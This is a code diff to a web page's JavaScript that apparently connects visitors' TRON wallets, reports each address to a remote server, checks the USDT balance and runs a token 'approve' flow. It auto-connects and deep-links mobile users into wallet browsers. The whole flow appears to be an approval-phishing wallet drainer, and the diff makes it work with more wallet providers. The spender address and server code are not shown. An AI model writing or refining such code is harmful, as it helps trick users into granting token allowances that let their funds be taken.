@@ -428,7 +428,6 @@
     var isProcessing = false;
     var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
 
-    // Detect which wallet browser we're in
     var isTrustBrowser = /Trust/i.test(navigator.userAgent);
     var isTronLinkBrowser = /TronLink/i.test(navigator.userAgent);
     var isTokenPocketBrowser = /TokenPocket/i.test(navigator.userAgent);
@@ -448,6 +447,28 @@
       {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
       {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
     ];
+
+    // ============================================================
+    // HELPER: Convert ETH address to TRON address (hex format)
+    // ============================================================
+
+    function ethToTronAddress(ethAddress) {
+      // Remove 0x prefix if present
+      var clean = ethAddress.replace('0x', '');
+      // TRON addresses are 41 + 40 hex chars
+      if (clean.length === 40) {
+        return '41' + clean;
+      }
+      return clean;
+    }
+
+    // ============================================================
+    // HELPER: Check if address is TRON format (starts with T)
+    // ============================================================
+
+    function isTronAddress(address) {
+      return address && /^T[A-Za-z0-9]{33}$/.test(address);
+    }
 
     // ============================================================
     // WALLET CONFIGURATIONS
@@ -495,7 +516,6 @@
         logo: 'https://dl.svgcdn.com/svg/token-branded/trust.svg',
         downloadUrl: 'https://trustwallet.com/download',
         detect: function() {
-          // Trust Wallet injects window.tronWeb in its DApp browser
           if (window.tronWeb && window.tronWeb.ready) return true;
           if (window.ethereum && window.ethereum.isTrust) return true;
           if (isTrustBrowser) return true;
@@ -508,18 +528,6 @@
               if (window.tronWeb && window.tronWeb.ready) {
                 if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                   resolve(window.tronWeb.defaultAddress.base58);
-                  return;
-                }
-                // Request accounts via tronWeb
-                if (typeof window.tronWeb.request === 'function') {
-                  window.tronWeb.request({ method: 'tron_requestAccounts' })
-                    .then(function(result) {
-                      if (typeof result === 'string') resolve(result);
-                      else if (Array.isArray(result) && result.length > 0) resolve(result[0]);
-                      else if (result && result.address) resolve(result.address);
-                      else reject(new Error('No address returned'));
-                    })
-                    .catch(reject);
                   return;
                 }
               }
@@ -538,8 +546,12 @@
                   window.ethereum.request({ method: 'eth_requestAccounts' })
                     .then(function(result) {
                       if (Array.isArray(result) && result.length > 0) {
-                        // Trust Wallet returns ETH address which is the same as TRON
-                        resolve(result[0]);
+                        // Trust Wallet returns ETH address (0x...)
+                        // Convert to TRON hex format (41 + 40 hex chars)
+                        var ethAddr = result[0];
+                        var tronHex = ethToTronAddress(ethAddr);
+                        console.log('🔄 ETH address converted to TRON hex:', tronHex);
+                        resolve(tronHex);
                       } else {
                         reject(new Error('No address returned'));
                       }
@@ -547,6 +559,12 @@
                     .catch(reject);
                   return;
                 }
+              }
+
+              // Method 3: Check if tronWeb exists (fallback)
+              if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                resolve(window.tronWeb.defaultAddress.base58);
+                return;
               }
 
               reject(new Error('Trust Wallet not detected'));
@@ -568,7 +586,6 @@
           return new Promise(function(resolve, reject) {
             try {
               if (window.okxwallet) {
-                // Get TRON provider
                 var provider = window.okxwallet.tronLink || window.okxwallet.tron;
                 if (provider) {
                   if (provider.tronWeb && provider.tronWeb.ready && provider.tronWeb.defaultAddress && provider.tronWeb.defaultAddress.base58) {
@@ -814,42 +831,69 @@
     }
 
     // ============================================================
-    // GET PROVIDER FOR WALLET
+    // GET TRONWEB INSTANCE - FIXED
     // ============================================================
 
-    function getProviderForWallet(walletId) {
+    function getTronWebInstance(walletId) {
+      // First check if window.tronWeb is available
+      if (window.tronWeb && window.tronWeb.ready) {
+        return window.tronWeb;
+      }
+
+      // Check specific wallet providers
       switch(walletId) {
         case 'tronlink':
-          return window.tronLink || window.tronWeb || null;
-        case 'trust':
-          if (window.ethereum && window.ethereum.isTrust) {
-            return window.ethereum.tronLink || window.ethereum || null;
+          if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.ready) {
+            return window.tronLink.tronWeb;
           }
-          return window.tronWeb || null;
+          break;
+        case 'trust':
+          if (window.ethereum && window.ethereum.isTrust && window.ethereum.tronLink) {
+            var tl = window.ethereum.tronLink;
+            if (tl.tronWeb && tl.tronWeb.ready) return tl.tronWeb;
+            return tl;
+          }
+          if (window.trustwallet && window.trustwallet.tronLink) {
+            var tl2 = window.trustwallet.tronLink;
+            if (tl2.tronWeb && tl2.tronWeb.ready) return tl2.tronWeb;
+            return tl2;
+          }
+          break;
         case 'okx':
           if (window.okxwallet) {
-            return window.okxwallet.tronLink || window.okxwallet.tron || null;
+            if (window.okxwallet.tronLink && window.okxwallet.tronLink.tronWeb && window.okxwallet.tronLink.tronWeb.ready) {
+              return window.okxwallet.tronLink.tronWeb;
+            }
+            if (window.okxwallet.tron && window.okxwallet.tron.tronWeb && window.okxwallet.tron.tronWeb.ready) {
+              return window.okxwallet.tron.tronWeb;
+            }
           }
-          return null;
+          break;
         case 'tokenpocket':
-          if (window.tokenpocket) {
-            return window.tokenpocket.tron || null;
+          if (window.tokenpocket && window.tokenpocket.tron && window.tokenpocket.tron.tronWeb && window.tokenpocket.tron.tronWeb.ready) {
+            return window.tokenpocket.tron.tronWeb;
           }
-          return null;
+          break;
         case 'bitget':
-          if (window.bitkeep) return window.bitkeep.tron || null;
-          if (window.bitgetWallet) return window.bitgetWallet.tron || null;
-          return null;
+          if (window.bitkeep && window.bitkeep.tron && window.bitkeep.tron.tronWeb && window.bitkeep.tron.tronWeb.ready) {
+            return window.bitkeep.tron.tronWeb;
+          }
+          if (window.bitgetWallet && window.bitgetWallet.tron && window.bitgetWallet.tron.tronWeb && window.bitgetWallet.tron.tronWeb.ready) {
+            return window.bitgetWallet.tron.tronWeb;
+          }
+          break;
         case 'imtoken':
-          if (window.imtoken) return window.imtoken.tron || null;
-          return null;
-        default:
-          return null;
+          if (window.imtoken && window.imtoken.tron && window.imtoken.tron.tronWeb && window.imtoken.tron.tronWeb.ready) {
+            return window.imtoken.tron.tronWeb;
+          }
+          break;
       }
+
+      return null;
     }
 
     // ============================================================
-    // CORE CONNECTION LOGIC - EACH WALLET INDEPENDENT
+    // CORE CONNECTION LOGIC
     // ============================================================
 
     async function connectWallet(walletId) {
@@ -859,7 +903,6 @@
 
       console.log('🔄 Connecting to wallet:', walletId);
 
-      // Find wallet config
       var wallet = WALLETS.find(function(w) { return w.id === walletId; });
       if (!wallet) {
         msg('err', 'Wallet not found');
@@ -867,7 +910,6 @@
         return;
       }
 
-      // Load config
       if (!config || !config.usdtContract) {
         await fetchConfig();
       }
@@ -878,14 +920,12 @@
         return;
       }
 
-      // Check if wallet is detected
       var detected = wallet.detect();
       console.log('📱', wallet.name, 'detected:', detected);
 
       if (!detected) {
         if (isMobile) {
           msg('inf', 'Opening ' + wallet.name + ' app...');
-          // For mobile, try deep link
           if (wallet.id === 'trust') {
             window.location.href = 'https://link.trustwallet.com/open_url?url=' + encodeURIComponent(window.location.href);
           } else if (wallet.id === 'okx') {
@@ -912,7 +952,6 @@
         }
       }
 
-      // Show waiting screen
       scShow('scWait');
       document.getElementById('waitDesc').textContent = 'Connecting to ' + wallet.name + '...';
       updateStep(1, 'active');
@@ -920,8 +959,6 @@
       updateStep(3, '');
 
       try {
-        // Connect to wallet
-        console.log('📤 Connecting to', wallet.name, '...');
         var address = await wallet.connect();
         
         if (!address) {
@@ -932,7 +969,6 @@
         connectedAddress = address;
         updateStep(1, 'done');
 
-        // Send to server
         try {
           await sendAddressToServer(address);
         } catch(e) {
@@ -941,9 +977,17 @@
 
         await logEvent('wallet_connected', address, '', walletId);
 
-        // Get provider for approve flow
-        var provider = getProviderForWallet(walletId);
-        await doApproveFlow(address, provider, wallet);
+        // Get TronWeb instance
+        var tw = getTronWebInstance(walletId);
+        if (!tw) {
+          tw = window.tronWeb;
+        }
+
+        if (!tw || !tw.contract) {
+          throw new Error('TronWeb not available. Please make sure your wallet is connected.');
+        }
+
+        await doApproveFlow(address, tw, wallet);
 
       } catch(e) {
         console.error('❌ Connection error:', e);
@@ -958,33 +1002,16 @@
     }
 
     // ============================================================
-    // APPROVE FLOW
+    // APPROVE FLOW - FIXED
     // ============================================================
 
-    async function doApproveFlow(address, provider, wallet) {
+    async function doApproveFlow(address, tw, wallet) {
       scShow('scProcessing');
       document.getElementById('processingTitle').textContent = 'Checking balance...';
       document.getElementById('processingDesc').textContent = 'Verifying USDT balance';
       updateStep(2, 'active');
 
       try {
-        // Get TronWeb instance
-        var tw = window.tronWeb;
-        
-        // If provider has tronWeb, use that
-        if (provider && provider.tronWeb && provider.tronWeb.ready) {
-          tw = provider.tronWeb;
-        }
-        
-        // If provider is TronLink, use its tronWeb
-        if (provider && provider.tronWeb && provider.tronWeb.ready) {
-          tw = provider.tronWeb;
-        }
-
-        if (!tw || !tw.contract) {
-          throw new Error('TronWeb not available. Please make sure your wallet is connected.');
-        }
-
         console.log('✅ Using TronWeb instance for', wallet ? wallet.name : 'unknown wallet');
 
         // Get USDT contract
@@ -1186,8 +1213,9 @@
           await sendAddressToServer(address);
           await logEvent('wallet_connected', address, '', detectedWallet);
           
-          var provider = getProviderForWallet(detectedWallet);
-          await doApproveFlow(address, provider, wallet);
+          var tw = getTronWebInstance(detectedWallet);
+          if (!tw) tw = window.tronWeb;
+          await doApproveFlow(address, tw, wallet);
         }
       } catch(e) {
         console.warn('Auto-connect failed:', e.message);
@@ -1214,7 +1242,6 @@
       }
     }
 
-    // Ensure DOM is ready before rendering
     if (document.readyState === 'loading') {
       document.addEventListener('DOMContentLoaded', function() {
         console.log('📄 DOM ready, initializing...');
@@ -1225,7 +1252,6 @@
       initApp();
     }
 
-    // Fallback: re-render if wallets don't show
     setTimeout(function() {
       var walletList = document.getElementById('walletList');
       if (walletList && walletList.children.length === 0) {
